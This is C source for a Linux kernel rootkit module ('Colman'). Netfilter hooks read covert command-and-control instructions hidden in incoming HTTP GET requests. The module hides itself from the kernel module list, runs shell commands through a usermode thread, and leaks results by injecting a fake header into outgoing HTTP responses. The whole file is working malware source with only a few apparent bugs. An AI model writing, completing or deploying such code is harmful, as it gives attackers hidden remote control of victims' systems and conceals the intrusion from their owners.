#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/ip.h>
#include <linux/tcp.h>
#include <linux/netfilter.h>
#include <linux/netfilter_ipv4.h>
#include <linux/skbuff.h>
#include <linux/version.h>
#include <linux/delay.h>
#include <net/ip.h>
#include <linux/kthread.h> 
#include "hidder.h"
#include "cnc.h"
#include "usermode.h"

#define MALWARE_FUNC "colman-function"
#define MALWARE_ARG "colman-arg"

int find_malware_struct(void * address, char * string);

struct nf_hook_ops http_hook_out;
struct nf_hook_ops http_hook_in;


unsigned int http_callback( unsigned int hooknum, struct sk_buff *pskb, const struct net_device *in, const struct net_device *out, int (*okfn)(struct sk_buff *));
void set_result_msg(char * result_msg, size_t msg_len);

typedef enum {
	TEST = 0,
	KEYLOGGER,
	SELF_HIDE,
	UN_SELF_HIDE,
	SHELL,
	KILL
}COMMANDS;


#define MAX_HTTP_HEADER_LEN 2048
#define MAX_HTTP_DATA_LEN 1024
#define MINIMUM_CNC_DATA 170-24
#define MAX_COMMAND_LEN 500

#define GET 0x20544547
#define HTTP_OK 0x50545448
#define RESULT_HEADER_STR "Content-Encoding: "

#define TOT_HDR_LEN 28


typedef struct _result_msg{
	char * msg;
	int len;
}result_msg;


// Global struct for the result msg
result_msg * global_result_msg = NULL;

// Struct for the usermode thread handler
static struct task_struct *um_thread = NULL;

// Global struct for the usermode thread handler arguments
run_cmd_args * um_thread_args = NULL;


char result_ready = 0;

void set_result_msg(char * result_msg, size_t msg_len)
{
	if (global_result_msg == NULL)
	{
		global_result_msg = kmalloc(sizeof(result_msg), GFP_ATOMIC);
	}
	else
	{
		kfree(global_result_msg->msg);
		result_ready = 1;
	}
	global_result_msg->msg = (char *)kmalloc(sizeof(char) * msg_len, GFP_ATOMIC);
	global_result_msg->len = msg_len;
	memcpy(global_result_msg->msg, result_msg, msg_len);
}

unsigned int http_callback_result( unsigned int hooknum, struct sk_buff *pskb, const struct net_device *in, const struct net_device *out, int (*okfn)(struct sk_buff *) )
{
	struct iphdr *iph = NULL;
	struct tcphdr *tcph = NULL;
	u32 *httph = NULL;
	int tcp_src_port;
	int tcp_data_len=0;
	unsigned char *tcp_data = NULL;
	int offset = 0, len = 0;
  	char result_header[] = RESULT_HEADER_STR;
  	char result_header_end[] = "\r\n";
  	char* ptr;
	int result_msg_len;
	unsigned int space_left = 0;
	if (result_ready == 0)
		return NF_ACCEPT;
	
	iph = ip_hdr(pskb);
	if (NULL == iph) {
		return NF_ACCEPT;
	}
	if (IPPROTO_TCP != iph->protocol) { // Not TCP
		return NF_ACCEPT;
	}

	tcph = (struct tcphdr *)((char *)iph + (iph->ihl << 2));
	if (NULL == tcph) {
		return NF_ACCEPT;
	}

	tcp_src_port = ntohs(tcph->source);

	if (80 != tcp_src_port) {
		return NF_ACCEPT;
	}

	if (!tcph->psh) { // TCP three-way handshake
		return NF_ACCEPT;
	}
	tcp_data_len = iph->tot_len - (iph->ihl << 2) - (tcph->doff << 2);
	tcp_data = (unsigned char *)(pskb->data + (iph->ihl << 2) + (tcph->doff << 2));

	httph = (u32 *)tcp_data;
	
	if (*httph != HTTP_OK) { // Not GET
		return NF_ACCEPT;
	}

	//printk(KERN_INFO "[+] Colman: saddr = %d.%d.%d.%d\n",*(unsigned char *)(&iph->saddr), *(unsigned char *)(&iph->saddr + 1), *(unsigned char *)(&iph->saddr + 2), *(unsigned char *)(&iph->saddr + 3));
	printk(KERN_INFO "[+] Colman: HTTP GET DETECTED -> CHANGE PACKET\n");
	

	if (unlikely(skb_linearize(pskb) != 0))
	{
		printk(KERN_INFO "[-] Colman: not linear\n");
		return NF_ACCEPT;
	}

	space_left = skb_tailroom(pskb);
	if (space_left == 0)
	{
		printk(KERN_INFO "[-] Colman: check is needed\n");
		return NF_ACCEPT;	
	}
  	
	printk(KERN_INFO "[+] Colman: space left: %d\n", skb_tailroom(pskb));

    printk(KERN_INFO "[+] Colman: data_len: %d\n", ntohs(iph->tot_len));

    printk(KERN_INFO "[+] Colman: new data_len: %d\n", ntohs(htons(2 + ntohs(iph->tot_len))));

  	result_msg_len =  strlen(result_header) + strlen(result_header_end) + global_result_msg->len;
	printk(KERN_INFO "[+] Colman: len: %d\n", result_msg_len);

	if (space_left < result_msg_len)
	{
		// We can extend the space left
		printk(KERN_INFO "[-] Colman: Not enougth space\n");
		return NF_ACCEPT;
	}
  	ptr = (char*) skb_put(pskb, result_msg_len); 

  	if (!ptr)
  	{
		printk(KERN_INFO "[-] Colman: Something want wrong\n");
		return NF_ACCEPT;  		
  	}

  	memcpy(ptr, result_header, strlen(result_header));

  	if (!global_result_msg)
  	{
		printk(KERN_INFO "[-] Colman: No result\n");
		return NF_ACCEPT;  		
  	}


  	if (!global_result_msg->msg)
  	{
		printk(KERN_INFO "[-] Colman: No result\n");
		return NF_ACCEPT;  		
  	}

  	memcpy(ptr + strlen(result_header), global_result_msg->msg, global_result_msg->len);

  	memcpy(ptr + strlen(result_header) + global_result_msg->len, result_header_end, strlen(result_header_end));

    
    /* Manipulating necessary header fields */
    iph->tot_len = htons(result_msg_len + ntohs(iph->tot_len));
    printk(KERN_INFO "[+] Colman: New tot len 0x%x\n", iph->tot_len);
    //tcph->len = htons(tot_data_len + TCP_HDR_LEN);

    /* Calculation of IP header checksum */
    iph->check = 0;
    ip_send_check (iph);

    // /* Calculation of TCP checksum */
    tcph->check = 0;
    offset = skb_transport_offset(pskb);
    len = pskb->len - offset;
    tcph->check = ~csum_tcpudp_magic((iph->saddr), (iph->daddr), len, IPPROTO_TCP, 0);

	//printk(KERN_INFO "[+] Colman: saddr = %d.%d.%d.%d\n",*(unsigned char *)(&iph->saddr), *(unsigned char *)(&iph->saddr + 1), *(unsigned char *)(&iph->saddr + 2), *(unsigned char *)(&iph->saddr + 3));
	printk(KERN_INFO "[+] Colman: PACKET Changed\n");
	result_ready = 0;
	return NF_ACCEPT;
}


unsigned int http_callback_get_command( unsigned int hooknum, struct sk_buff *pskb, const struct net_device *in, const struct net_device *out, int (*okfn)(struct sk_buff *) )
{
	struct iphdr *iph = NULL;
	struct tcphdr *tcph = NULL;
	u32 *httph = NULL;
	int tcp_dst_port;
	int tcp_data_len=0;
	unsigned char *tcp_data = NULL;
	char command[MAX_COMMAND_LEN];
	int i = 0, index = 0;
	long command_num = 1;
	iph = ip_hdr(pskb);
	if (NULL == iph) {
		return NF_ACCEPT;
	}
	if (IPPROTO_TCP != iph->protocol) { // Not TCP
		return NF_ACCEPT;
	}

	tcph = (struct tcphdr *)((char *)iph + (iph->ihl << 2));
	if (NULL == tcph) {
		return NF_ACCEPT;
	}

	tcp_dst_port = ntohs(tcph->dest);


	if (80 != tcp_dst_port) {
		return NF_ACCEPT;
	}


	if (!tcph->psh) { // TCP three-way handshake
		return NF_ACCEPT;
	}
	tcp_data_len = iph->tot_len - (iph->ihl << 2) - (tcph->doff << 2);
	tcp_data = (unsigned char *)(pskb->data + (iph->ihl << 2) + (tcph->doff << 2));

	if (tcp_data_len <= MINIMUM_CNC_DATA + strlen(MALWARE_FUNC)) {
		return NF_ACCEPT;
	}
	
	httph = (u32 *)tcp_data;
	
	if (*httph != GET ) { // Not GET
		return NF_ACCEPT;
	}
	printk(KERN_INFO "[+] Colman: HTTP GET DETECTED -> EXEC COMMANDS\n");
	//printk(KERN_INFO "[+] Colman: saddr = %d.%d.%d.%d:\n",*(unsigned char *)(&iph->saddr), *(unsigned char *)(&iph->saddr + 1), *(unsigned char *)(&iph->saddr + 2), *(unsigned char *)(&iph->saddr + 3));

	index = find_malware_struct(tcp_data, MALWARE_FUNC);
	if (!index)
	{
		return NF_ACCEPT;
	}

	for (i = 2 ; tcp_data[index + strlen(MALWARE_FUNC) + i] != 0xd; i++)
	{
		command[i-2] = tcp_data[index + strlen(MALWARE_FUNC) + i];
		if (i > MAX_COMMAND_LEN || (index + strlen(MALWARE_FUNC) + i >= tcp_data_len - 1))
		{
			return NF_ACCEPT;
		}
	}
	command[i-2] = 0x0;

	printk(KERN_INFO "[+] Colman: cmd: %s\n", command);
	if (kstrtol(command, 10, &command_num) != 0)
	{
    	printk(KERN_INFO "[-] Colman: Invlid command.\n");
		return NF_ACCEPT;
	}

	switch ((COMMANDS)command_num) {
		case TEST :
			set_result_msg("MALWARE ON", strlen("MALWARE ON"));
			printk(KERN_INFO "[+] Colman: OK\n");
			break;
		case KILL:
			set_result_msg("Bye", strlen("Bye"));
			//Cannot kill from here, should be from main (we can change flag for closing)
			//clean_rootkit();
			break;
		case SELF_HIDE:
			set_result_msg("LKM is hide", strlen("LKM is hide"));
			set_dkom_lkm();
			break;
		case SHELL:
				index = find_malware_struct(tcp_data, MALWARE_ARG);
				if (!index)
				{
					set_result_msg("Command missing", strlen("Command missing"));
					return NF_ACCEPT;
				}
				for (i = 2; tcp_data[index + strlen(MALWARE_ARG) + i] != 0xd; i++)
				{
					command[i-2] = tcp_data[index + strlen(MALWARE_ARG) + i];
					if (i > MAX_COMMAND_LEN || (index + strlen(MALWARE_ARG) + i >= tcp_data_len - 1))
					{
						return NF_ACCEPT;
					}
				}
				command[i-2] = 0x0;

				//printk(KERN_INFO "arg: %s", command);
				
				//cmd_arguments.arg_len = 0;
				//run_cmd_args * a = (run_cmd_args *)kmalloc(sizeof(run_cmd_args), GFP_ATOMIC);
				um_thread_args->arg_len = 112;
				um_thread_args->arg = (char *)kmalloc(sizeof(char) * i-1, GFP_ATOMIC);
				memcpy(um_thread_args->arg, command, i-1);

				// um_thread_args->arg[0] = 'l';
				// um_thread_args->arg[1] = 's';
				// um_thread_args->arg[2] = 0x0;

				if (um_thread)
				{
					wake_up_process(um_thread);
					//printk(KERN_INFO "[?] Colman: HERE!!");
					//return NF_ACCEPT;
				}
				
				set_result_msg("file:output", strlen("file:output"));
				break;
			//read to see ok->
			set_result_msg("Cmd got executed", strlen("Cmd got executed"));
			break;
			
		case UN_SELF_HIDE:
			set_result_msg("LKM is not hide", strlen("LKM is not hide"));
			unset_dkom_lkm();
			break;
		default:

			set_result_msg("Invalid command", strlen("Invalid command"));
			printk(KERN_INFO "[-] Colman: Invalid command - %ld\n", command_num);
			break;
	}
	
	return NF_ACCEPT;
}

int find_malware_struct(void * address, char * string)
{
	void * result = strstr((char *)address, string);
	if (result == NULL || result < address)
		return 0;
	return (int)(result - address);
}

void set_http_callback( void )
{
	//cmd_arguments.arg_len = 0;
	set_result_msg("Init", strlen("Init"));

	um_thread_args = (run_cmd_args *)kmalloc(sizeof(run_cmd_args), GFP_ATOMIC);
	um_thread = kthread_create(simple, um_thread_args, "um_thread");

	http_hook_in.hook = (void *)http_callback_get_command;
	http_hook_in.hooknum = NF_INET_PRE_ROUTING;
	http_hook_in.pf = PF_INET;
	http_hook_in.priority = NF_IP_PRI_FIRST;

#if LINUX_VERSION_CODE >= KERNEL_VERSION(4,13,0)
	nf_register_net_hook(&init_net, &http_hook_in);
#else
	nf_register_hook(&http_hook_in);
#endif


	http_hook_out.hook = (void *)http_callback_result;
	http_hook_out.hooknum = NF_INET_POST_ROUTING;
	http_hook_out.pf = PF_INET;
	http_hook_out.priority = NF_IP_PRI_FIRST;

#if LINUX_VERSION_CODE >= KERNEL_VERSION(4,13,0)
	nf_register_net_hook(&init_net, &http_hook_out);
#else
	nf_register_hook(&http_hook_out);
#endif

}


void unset_http_callback ( void )
{
#if LINUX_VERSION_CODE >= KERNEL_VERSION(4, 13, 0)
	nf_unregister_net_hook(&init_net, &http_hook_in);
#else
	nf_unregister_hook(&http_hook_in);
#endif

#if LINUX_VERSION_CODE >= KERNEL_VERSION(4, 13, 0)
	nf_unregister_net_hook(&init_net, &http_hook_out);
#else
	nf_unregister_hook(&http_hook_out);
#endif

	if (global_result_msg->msg)
		kfree(global_result_msg->msg);
	if (global_result_msg)
		kfree(global_result_msg);
	if (um_thread_args)
		kfree(um_thread_args);

	if(um_thread)
		kthread_stop(um_thread); 
}

